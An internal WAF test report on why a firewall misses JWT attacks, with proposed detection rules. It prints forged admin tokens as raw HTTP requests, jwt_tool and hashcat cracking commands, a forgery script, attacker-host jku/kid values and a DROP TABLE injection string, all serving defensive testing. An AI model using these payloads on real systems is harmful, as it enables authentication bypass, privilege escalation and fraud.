# WAF Security Report — JWT Attack Detection Gap Analysis

**Prepared for:** Security Team / WAF Engineering  
**Classification:** Internal — Security Sensitive  
**Date:** 2026-06-11  
**System under test:** Aegis-Gate WAF (http://sec-team.waf-exams.info, via localhost:8080)  
**Reference:** [PayloadsAllTheThings — JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

---

## Executive Summary

| Metric | Value |
|--------|-------|
| Attack type | JWT Attack |
| Total samples tested | 600 |
| Detected (blocked) | 5 (0.8%) |
| **Missed (False Negative)** | **595 (99.2%)** |
| All 8 sub-techniques | **0% detection each** |
| Root cause | WAF does not decode or inspect JWT content in Cookie headers |

The 5 "blocked" samples are incidental — they were blocked by unrelated rules (e.g. path-based rules), not JWT inspection. Effective JWT detection rate is **0%**.

---

## 1. What is a JWT Attack?

JSON Web Token (JWT) is an open standard (RFC 7519) for compact, self-contained transmission of claims between parties as a signed JSON object. A JWT consists of three Base64URL-encoded parts separated by dots:

```
BASE64URL(Header) . BASE64URL(Payload) . BASE64URL(Signature)
```

**Example — legitimate token decoded:**
```
Encoded:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  .eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciIsImV4cCI6MTcwMDAwMDAwMH0
  .valid_signature

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"user": "alice", "role": "user", "exp": 1700000000}
```

**In the NovaBet system**, JWT is placed in the HttpOnly cookie `sid`. Every authenticated request sends:

```http
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<signature>
```

JWT attacks exploit weaknesses in how servers validate the token — specifically the algorithm field, external key references, and signature verification logic — to forge tokens with elevated privileges (e.g., `"role": "admin"`) without knowing the signing secret.

---

## 2. Root Cause of WAF Miss

**The WAF does not inspect the content of JWT tokens carried in the `Cookie` header.**

All 600 attack samples inject malicious JWTs into `Cookie: sid=<token>`. The WAF processes URL paths, query strings, and request bodies for injection patterns, but performs no Base64URL decoding of cookie values to inspect the JWT header fields (`alg`, `jku`, `x5u`, `kid`, `x5c`) or payload claims (`role`, `exp`, `iat`).

This is a structural gap, not a rule-tuning issue. No amount of signature-pattern matching on the raw token string will catch these attacks — they require semantic parsing of the JWT structure.

---

## 3. Attack Technique Analysis — 8 Sub-techniques, All Missed

### 3.1 `alg_none_no_signature` — 82 samples, 0% detected

**Severity:** Critical  
**CVE:** CVE-2015-9235  

**Description:**  
RFC 7518 defines `"none"` as a valid algorithm value, meaning the token requires no signature. An attacker decodes any valid JWT, replaces the `alg` field with `"none"`, modifies the payload to elevate privileges (e.g., `role: admin`), discards the signature, and sends the token. Vulnerable JWT libraries that accept `alg: none` without restriction will verify successfully against an empty signature.

**Attack pattern:**
```
Original token:
  Header:  {"alg": "HS256", "typ": "JWT"}
  Payload: {"user": "alice", "role": "user", "exp": 1700000000}
  Sig:     valid_hmac_signature

Forged token (alg:none):
  Header:  {"alg": "none", "typ": "JWT"}
  Payload: {"user": "admin", "role": "admin", "user_id": 2}
  Sig:     (empty — trailing dot only)
```

**Dataset sample — ID=2, GET /ws/live:**
```http
GET /ws/live HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ1c2VyX2lkIjoyfQ.
Content-Type: application/json
User-Agent: waf-attack-test/1.0

[Decoded JWT header]:  {"alg": "none", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin", "user_id": 2}
[Signature]:           (empty — only the trailing dot is present)
```

**Dataset sample — ID=4, GET /admin/dashboard:**
```http
GET /admin/dashboard HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6MX0.
Content-Type: application/json

[Decoded JWT header]:  {"alg": "none", "typ": "JWT"}
[Decoded JWT payload]: {"user": "bob", "role": "admin", "user_id": 1}
```

**Dataset sample — ID=13, POST /api/bet-reports/export:**
```http
POST /api/bet-reports/export HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIiwidXNlcl9pZCI6Mn0.
Content-Type: application/json

[Decoded JWT header]:  {"alg": "none", "typ": "JWT"}
[Decoded JWT payload]: {"user": "bob", "role": "admin", "user_id": 2}
```

**Expected impact:** `forged_admin_jwt_no_validation` — attacker gains admin access to any authenticated endpoint.

**Tool:** `python3 jwt_tool.py [JWT] -X a`

---

### 3.2 `alg_none_capital_bypass` — 65 samples, 0% detected

**Severity:** Critical  

**Description:**  
A variant of the `alg:none` attack. Some JWT libraries reject lowercase `"none"` but accept capitalized variants like `"None"`, `"NONE"`, or `"nOnE"`. This is a case-sensitivity bypass of string-matching defenses. The attack mechanics are identical to 3.1, but the header value is case-varied.

**Variants observed in the wild:**
```
"alg": "None"    ← Title case
"alg": "NONE"    ← All caps
"alg": "nOnE"    ← Mixed case
"alg": "NoNe"    ← Alternating case
"alg": "nonE"    ← Trailing capital
```

**Dataset sample — ID=29, GET /api/transactions:**
```http
GET /api/transactions HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

[Decoded JWT header]:  {"alg": "None", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=50, GET /ws/live:**
```http
GET /ws/live HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

[Decoded JWT header]:  {"alg": "None", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=52, POST /withdrawal:**
```http
POST /withdrawal HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
Content-Type: application/json

{"amount": 5000.00, "currency": "USD"}

[Decoded JWT header]:  {"alg": "None", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Expected impact:** `alg_none_case_variation_bypass` — bypasses naive string-equality checks on the `alg` field.

**Detection note:** Any rule matching `alg:none` must use case-insensitive comparison: `alg.lower() in ["none"]`.

---

### 3.3 `rs256_to_hs256_confusion` — 83 samples, 0% detected

**Severity:** Critical  
**CVE:** CVE-2016-5431 (also known as "algorithm confusion attack" or "key confusion attack")

**Description:**  
This attack exploits systems that use RS256 (asymmetric RSA signing). The server's RSA public key is publicly accessible. An attacker:
1. Downloads the server's RSA public key (from TLS certificate or JWKS endpoint)
2. Changes the token's `alg` from `RS256` to `HS256` (symmetric HMAC)
3. Signs the forged token using HMAC-SHA256 with the **RSA public key as the HMAC secret**
4. Sends the token

Vulnerable servers will call their verify function with the public key. When `alg=HS256`, the library uses the key as an HMAC secret rather than an RSA public key — and since the attacker signed with the same key, verification succeeds.

**Attack construction:**
```python
import jwt
# Attacker has the server's public key (publicly available)
public_key = open('server_public.pem', 'r').read()

# Forge admin token using public key as HMAC secret
forged_token = jwt.encode(
    {"user": "admin", "role": "admin", "iat": 1700000000},
    key=public_key,
    algorithm='HS256'  # ← switch from RS256 to HS256
)
```

**Manual construction (from PayloadsAllTheThings):**
```bash
# Step 1: extract public key from TLS cert
openssl s_client -connect sec-team.waf-exams.info:443 | openssl x509 -pubkey -noout > public.pem

# Step 2: forge token with jwt_tool
python3 jwt_tool.py [JWT_HERE] -X k -pk public.pem
```

**Dataset sample — ID=7, POST /withdrawal:**
```http
POST /withdrawal HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.ZmFrZXNpZ25hdHVyZV9yc2FfcHViX2FzX2htYWNfc2VjcmV0
Content-Type: application/json

{"amount": 500.00, "bank_account": "9876543210"}

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin", "iat": 1700000000}
```

**Dataset sample — ID=38, GET /admin/dashboard:**
```http
GET /admin/dashboard HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.ZmFrZXNpZ25hdHVyZV9yc2FfcHViX2FzX2htYWNfc2VjcmV0

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin", "iat": 1700000000}
```

**Dataset sample — ID=46, POST /withdrawal:**
```http
POST /withdrawal HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.ZmFrZXNpZ25hdHVyZV9yc2FfcHViX2FzX2htYWNfc2VjcmV0

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "admin", "role": "admin", "iat": 1700000000}
```

**Expected impact:** `signature_verification_bypass_key_confusion` — complete authentication bypass on all RS256-protected endpoints.

**Detection heuristic:** If the application is configured to use RS256, any incoming token with `alg: HS256` is suspicious and should be flagged. The WAF must know the expected algorithm(s) per application to apply this rule.

---

### 3.4 `jku_ssrf_attacker_controlled_jwks` — 85 samples, 0% detected

**Severity:** Critical  

**Description:**  
The JWT header field `jku` (JWK Set URL, defined in RFC 7517) allows a token to specify a URL from which the server should fetch the JSON Web Key Set (JWKS) used to verify the token's signature. If the server fetches this URL without validating that it points to a trusted domain, an attacker can:

1. Generate their own RSA key pair
2. Host a JWKS containing their public key at an attacker-controlled URL
3. Issue a JWT signed with their private key, with `jku` pointing to their JWKS URL
4. The server fetches the attacker's JWKS, retrieves the attacker's public key, and verifies the signature — successfully

This is both an SSRF (Server-Side Request Forgery) vector and an authentication bypass.

**Common legitimate JWKS endpoints (for reference):**
```
/.well-known/jwks.json
/jwks.json
/openid/connect/jwks.json
/api/keys
/api/v1/keys
/{tenant}/oauth2/v1/certs
```

**Attack JWKS file hosted at attacker.evil.com/jwks.json:**
```json
{
  "keys": [{
    "kty": "RSA",
    "use": "sig",
    "kid": "attacker-key-1",
    "alg": "RS256",
    "n": "<attacker_public_modulus_base64url>",
    "e": "AQAB"
  }]
}
```

**Dataset sample — ID=3, POST /deposit:**
```http
POST /deposit HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXZpbC5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakersasig
Content-Type: application/json

{"amount": 1000.00, "currency": "USD"}

[Decoded JWT header]:  {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.evil.com/jwks.json"   ← external attacker URL
}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=5, GET /api/profile:**
```http
GET /api/profile HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXZpbC5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakersasig

[Decoded JWT header]:  {"alg": "RS256", "typ": "JWT", "jku": "https://attacker.evil.com/jwks.json"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=9, GET /user/settings:**
```http
GET /user/settings HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXZpbC5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakersasig

[Decoded JWT header]:  {"alg": "RS256", "typ": "JWT", "jku": "https://attacker.evil.com/jwks.json"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Expected impact:** `ssrf_and_signature_bypass_via_jku` — SSRF against the application server + full authentication bypass.

**Note:** The `x5u` header field is analogous to `jku` but points to an X.509 certificate chain URL. The same attack applies and must be covered by the same rule.

**Tool:** `python3 jwt_tool.py JWT_HERE -X s -ju http://attacker.com/jwks.json`

---

### 3.5 `x5c_cert_injection` — 71 samples, 0% detected

**Severity:** Critical  
**CVE:** CVE-2018-0114  

**Description:**  
The JWT header field `x5c` (X.509 Certificate Chain) allows embedding a PEM-encoded public key certificate directly in the token header. If the server uses the `x5c` value to derive the verification key instead of retrieving it from a trusted key store, an attacker can:

1. Generate a self-signed certificate and private key
2. Embed the certificate in the `x5c` header field
3. Sign the forged JWT with the corresponding private key
4. The server uses the embedded `x5c` certificate to verify — and succeeds, since the signature matches the embedded key

**Forged token header (decoded):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": [
    "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAttackerCert=="
  ]
}
```

**x5c injection construction (from PayloadsAllTheThings):**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SF..."
  }
}
```

**Tool:** `python3 jwt_tool.py [JWT_HERE] -X i`

**Dataset sample — ID=1, GET /api/rewards/claim:**
```http
GET /api/rewards/claim HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXR0YWNrZXJDZXJ0PT0iXX0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig
Content-Type: application/json

[Decoded JWT header]:  {
  "alg": "RS256",
  "typ": "JWT",
  "x5c": ["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAttackerCert=="]
}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=22, GET /admin/dashboard:**
```http
GET /admin/dashboard HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXR0YWNrZXJDZXJ0PT0iXX0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig

[Decoded JWT header]:  {"alg": "RS256", "typ": "JWT", "x5c": ["MIICIjANBgkq..."]}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=23, GET /ws/live:**
```http
GET /ws/live HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1YyI6WyJNSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXR0YWNrZXJDZXJ0PT0iXX0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig

[Decoded JWT header]:  {"alg": "RS256", "typ": "JWT", "x5c": ["MIICIjANBgkq..."]}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Expected impact:** `signature_bypass_via_attacker_controlled_x5c`

**Detection rule:** Flag any JWT where the header contains the `x5c` field. Legitimate production tokens should not embed certificate chains inline in every request — keys should be managed server-side via a JWKS endpoint.

---

### 3.6 `kid_header_path_traversal_or_sqli` — 69 samples, 0% detected

**Severity:** Critical  

**Description:**  
The `kid` (Key ID) JWT header field is intended to identify which key the server should use for signature verification. If the server uses this value directly in a file path lookup or SQL query without sanitization, an attacker can inject:

- **Path traversal** to reference a predictable file with known content (e.g., `/dev/null` → empty content → empty HMAC key → signature is `HMAC("", "")`
- **SQL injection** to manipulate key lookup queries
- **Remote file inclusion** via URL schemes

**Attack variants:**
```json
{"kid": "/dev/null"}                          → HMAC with empty key (empty file)
{"kid": "../../dev/null"}                     → path traversal
{"kid": "/proc/sys/kernel/randomize_va_space"} → known content (value: "2\n") as key
{"kid": "/etc/passwd"}                        → attacker knows file content → forge key
{"kid": "key' OR '1'='1"}                     → SQL injection into key lookup
{"kid": "key'; DROP TABLE signing_keys; --"}  → destructive SQL injection
{"kid": "http://attacker.com/evil.key"}       → remote key fetch (SSRF)
```

**Tool:**
```bash
# Path traversal to /dev/null (empty HMAC key)
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**Dataset sample — ID=6, GET /api/rewards/claim:**
```http
GET /api/rewards/claim HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=10, GET /api/rewards/claim:**
```http
GET /api/rewards/claim HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Dataset sample — ID=18, GET /ws/live:**
```http
GET /ws/live HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.fakesig
Upgrade: websocket
Connection: Upgrade

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"}
[Decoded JWT payload]: {"user": "admin", "role": "admin"}
```

**Expected impact:** `rce_or_sqli_via_kid_header_injection`

**Detection patterns for `kid` field:**
- Contains `../` or `..\\`
- Starts with `/etc/`, `/dev/`, `/proc/`, `/sys/`
- Contains SQL operators: `'`, ` OR `, `--`, `;`, `UNION`, `SELECT`
- Contains URL schemes: `http://`, `https://`, `file://`

---

### 3.7 `weak_secret_brute_forced` — 73 samples, 0% detected

**Severity:** Critical  

**Description:**  
If a JWT is signed with HMAC (HS256/HS384/HS512) using a weak or guessable secret (e.g., `"secret"`, `"password"`, `"jwt_secret"`, the application name), an attacker can brute-force the secret offline using the token's structure. The HMAC signature is the only thing preventing token forgery; once the secret is known, any payload can be signed.

**Brute-force process:**
```bash
# Using jwt_tool with dictionary attack
python3 jwt_tool.py eyJhbGciOiJIUzI1... -d /tmp/wordlist -C

# Using hashcat for GPU-accelerated cracking
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Dictionary: https://github.com/wallarm/jwt-secrets (3502 common JWT secrets)
```

**Common weak secrets found in production:**
```
"secret"         "password"        "123456"
"jwt_secret"     "your-256-bit-secret"
"novabet"        "novabeat"        "nova_secret"
"supersecret"    "mysecret"        "changeme"
"dev"            "test"            "localhost"
```

The `expected_impact` field in the dataset explicitly names the cracked secret:
- `valid_forged_jwt_with_weak_secret_jwt_secret`
- `valid_forged_jwt_with_weak_secret_novabet`
- `valid_forged_jwt_with_weak_secret_password`

This means these tokens have **valid, verifiable signatures** — they will pass backend JWT verification.

**Dataset sample — ID=8, GET /admin/dashboard (secret: "jwt_secret"):**
```http
GET /admin/dashboard HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJiYWxhbmNlIjo5OTk5OTl9.dx6FMTxbH6V6ZFS8vnnsImoSL7hWemOLJ_2BOiPchvI

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "alice", "role": "admin", "balance": 999999}
[Signature]:           VALID — signed with weak secret "jwt_secret"
```

**Dataset sample — ID=11, GET /ws/live (secret: "novabet"):**
```http
GET /ws/live HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJiYWxhbmNlIjo5OTk5OTl9.8AYpEOo6wpxyNK24dGnewNYcxAhJn8dxQ==

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "alice", "role": "admin", "balance": 999999}
[Signature]:           VALID — signed with weak secret "novabet"
```

**Dataset sample — ID=12, GET /api/rewards/claim (secret: "password"):**
```http
GET /api/rewards/claim HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJiYWxhbmNlIjo5OTk5OTl9.UQ8sHy8ExC_HlSqAg7==

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {"user": "alice", "role": "admin", "balance": 999999}
[Signature]:           VALID — signed with weak secret "password"
```

**Note:** Because these tokens have valid signatures, they are indistinguishable from legitimate tokens at the cryptographic level. Detection must rely on behavioral heuristics (e.g., a regular user `alice` claiming `role: admin`).

---

### 3.8 `token_claim_manipulation` — 72 samples, 0% detected

**Severity:** Critical  

**Description:**  
The attacker modifies the JWT payload — specifically privilege-related claims (`role`, `sub`, `scope`) and time-related claims (`exp`, `iat`, `nbf`) — then sends the token with an invalid or fabricated signature. This exploits servers that do not strictly verify the signature, or that verify the structure but have a logic bug in claim validation.

Key indicators in forged tokens:
- `"role": "admin"` / `"superadmin"` for a normal user account
- `"exp": 9999999999` — expiration timestamp in year 2286
- `"iat": 0` and `"nbf": 0` — issued-at and not-before set to Unix epoch (invalid for a recently issued token)
- `"balance": 999999` — unusually large balance value injected into claims

**Dataset sample — ID=26, POST /deposit:**
```http
POST /deposit HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MCwibmJmIjowfQ.invalidsignature
Content-Type: application/json

{"amount": 5000.00, "currency": "USD"}

[Decoded JWT header]:  {"alg": "HS256", "typ": "JWT"}
[Decoded JWT payload]: {
  "user": "alice",
  "role": "admin",       ← privilege escalation
  "exp":  9999999999,    ← year 2286, suspicious far-future expiration
  "iat":  0,             ← Unix epoch, token "issued" in 1970
  "nbf":  0              ← not-before in 1970
}
```

**Dataset sample — ID=30, GET /admin/users:**
```http
GET /admin/users HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MCwibmJmIjowfQ.invalidsignature

[Decoded JWT payload]: {"user": "alice", "role": "admin", "exp": 9999999999, "iat": 0, "nbf": 0}
```

**Dataset sample — ID=43, GET /api/transactions:**
```http
GET /api/transactions HTTP/1.1
Host: localhost:8080
Cookie: sid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTksImlhdCI6MCwibmJmIjowfQ.invalidsignature

[Decoded JWT payload]: {"user": "alice", "role": "admin", "exp": 9999999999, "iat": 0, "nbf": 0}
```

**Expected impact:** `privilege_escalation_via_modified_claims`

---

## 4. Detection Rules — Recommended WAF Updates

The WAF must be extended to perform the following inspection on any `Cookie` header that contains a value matching the JWT pattern `[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*`:

```
PRE-CONDITION: Detect JWT in Cookie
  regex on Cookie header value: /^[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*$/
  if matches → Base64URL-decode part[0] → parse as JSON → apply rules below
```

```
RULE JWT-001 — alg:none (case-insensitive)
  jwt_header["alg"].lower() in ["none", "null", ""]
  → ACTION: BLOCK 403
  → COVERS: alg_none_no_signature, alg_none_capital_bypass
```

```
RULE JWT-002 — External JWKS URL (jku / x5u fields)
  jwt_header.has_key("jku") AND domain(jwt_header["jku"]) NOT IN allowed_domains
  jwt_header.has_key("x5u") AND domain(jwt_header["x5u"]) NOT IN allowed_domains
  → ACTION: BLOCK 403
  → COVERS: jku_ssrf_attacker_controlled_jwks
  NOTE: allowed_domains should be a static whitelist (e.g., ["sec-team.waf-exams.info"])
```

```
RULE JWT-003 — x5c cert injection
  jwt_header.has_key("x5c")
  → ACTION: BLOCK 403 (or FLAG for review)
  → COVERS: x5c_cert_injection
```

```
RULE JWT-004 — kid path traversal / SQL injection
  jwt_header.has_key("kid") AND (
    contains(jwt_header["kid"], "../") OR
    contains(jwt_header["kid"], "/dev/") OR
    contains(jwt_header["kid"], "/etc/") OR
    contains(jwt_header["kid"], "/proc/") OR
    regex(jwt_header["kid"], /['";]|(\bOR\b)|(\bAND\b)|(\bUNION\b)|(--)/) OR
    regex(jwt_header["kid"], /^https?:\/\//)
  )
  → ACTION: BLOCK 403
  → COVERS: kid_header_path_traversal_or_sqli
```

```
RULE JWT-005 — Suspicious claims (privilege escalation heuristic)
  jwt_payload.has_key("role") AND jwt_payload["role"] IN [
    "admin", "superadmin", "root", "administrator", "superuser", "system"
  ]
  → ACTION: FLAG for additional verification (CAPTCHA / MFA challenge)
  NOTE: This rule has false-positive risk for legitimate admin users; combine with
        additional signals (new IP, unusual time, role mismatch vs session store)
```

```
RULE JWT-006 — Anomalous time claims
  jwt_payload["exp"] > (current_unix_time + 315360000)  ← expires > 10 years from now
  jwt_payload["iat"] < (current_unix_time - 315360000)  ← issued > 10 years ago
  jwt_payload["iat"] == 0 AND jwt_payload["nbf"] == 0   ← clearly forged epoch timestamps
  → ACTION: BLOCK 403
  → COVERS: token_claim_manipulation
```

```
RULE JWT-007 — Algorithm confusion (requires WAF config per application)
  IF application_expected_alg == "RS256" AND jwt_header["alg"] == "HS256"
  → ACTION: BLOCK 403
  → COVERS: rs256_to_hs256_confusion
```

---

## 5. Testing Recommendations

Use [`jwt_tool`](https://github.com/ticarpi/jwt_tool) for direct testing against the WAF once rules are deployed:

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Test alg:none
python3 jwt_tool.py <VALID_JWT> -X a

# Test RS256→HS256 confusion
python3 jwt_tool.py <VALID_JWT> -X k -pk server_public.pem

# Test jku SSRF
python3 jwt_tool.py <VALID_JWT> -X s -ju http://attacker.com/jwks.json

# Test x5c injection
python3 jwt_tool.py <VALID_JWT> -X i

# Test kid path traversal
python3 jwt_tool.py <VALID_JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Brute force weak secret
python3 jwt_tool.py <VALID_JWT> -d jwt-secrets-list.txt -C
```

Re-run the dataset test after deploying rules:
```bash
cd /Users/sabo/Workspace/waf/load_test
python3 attack_analysis.py --types jwt --rate 50 --fn-only
```

**Target:** Detection rate should reach ≥95% on `alg_none_*`, `jku_*`, `x5c_*`, and `kid_*` techniques. The `weak_secret_brute_forced` technique requires application-layer defense (secret rotation + minimum entropy enforcement) in addition to WAF heuristics.

---

*End of JWT Attack Report*
